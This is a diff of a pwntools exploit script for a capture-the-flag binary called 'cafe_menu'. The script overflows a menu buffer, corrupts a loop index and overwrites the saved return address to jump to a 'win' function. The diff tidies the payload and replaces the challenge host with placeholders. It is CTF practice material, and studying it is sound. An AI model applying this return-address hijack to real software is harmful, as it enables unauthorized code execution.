@@ -1,39 +1,36 @@
 #!/usr/bin/env python3
 from pwn import *
 
-exe = ELF('cafe_menu', checksec=False)
-context.os = 'linux'
+exe = ELF('./cafe_menu')
 context.binary = exe
-context.arch = 'amd64'
+context.arch   = 'amd64'
+context.os     = 'linux'
 
-HOST, PORT = 'offsec.m0lecon.it', 13600
+HOSTNAME = 'HOSTNAME_PLACEHOLDER'
+PORT     = 0  # PORT_PLACEHOLDER
 
+# ── offsets ───────────────────────────────────────────────────────────────────
 OFFSET_TO_RIP = 72
-GADGET = 0x000000000040101a
 
 def conn():
     if args.LOCAL:
-        r = process(exe.path)
-    else:
-        r = remote(HOST, PORT)
-    return r
+        return process(exe.path)
+    return remote(HOSTNAME, PORT)
 
 def main():
     r = conn()
 
-    r.recvuntil(b'Enter today\'s specials (send 0xff to finish):')
+    # ── exploit phase ─────────────────────────────────────────────────────────
+    r.recvuntil(b"Enter today's specials (send 0xff to finish):")
 
-    payload = b'A' * 48  # fill menu completely
-    payload += b'\x47'  # overwrite idx low byte → after idx++, idx=72
-    payload += p64(exe.sym.win)  # written directly to saved RIP
-    payload += b'\xff'  # terminate the loop
-
+    payload = flat(
+        b'A' * 48,          # fill menu[0..47] completely
+        b'\x47',            # overwrite idx low byte; after idx++, idx = 72
+        p64(exe.sym.win),   # 8 bytes written one-by-one to menu[72..79] = saved RIP
+        b'\xff',            # terminate the loop and trigger the return
+    )
     r.send(payload)
     r.interactive()
-
-
-    r.interactive()
-
 
 if __name__ == '__main__':
     main()
